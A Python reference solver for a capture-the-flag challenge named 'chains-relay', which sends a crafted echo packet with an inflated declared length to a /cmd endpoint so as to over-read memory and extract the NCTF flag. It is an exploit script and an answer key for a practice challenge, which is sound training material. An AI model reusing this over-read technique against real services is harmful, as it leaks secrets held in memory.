#!/usr/bin/env python3
"""Reference solver for chains-relay.

The echo op (0x02) copies `length` bytes from a buffer that holds our value then
the secret. Send a tiny value with a large declared length to over-read the flag.

    python3 solve.py http://HOST:PORT
"""
import json
import re
import sys
import urllib.request


def _post(url, obj):
    req = urllib.request.Request(
        url,
        data=json.dumps(obj).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    return json.loads(urllib.request.urlopen(req, timeout=10).read())


def solve(base):
    base = base.rstrip("/")
    # type=0x02 (echo), length=0xff (over-read), value = one byte 0x41
    packet = "02ff41"
    data = _post(base + "/cmd", {"packet": packet})["data"]
    m = re.search(r"NCTF\{[^}]*\}", data)
    return m.group(0) if m else data


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
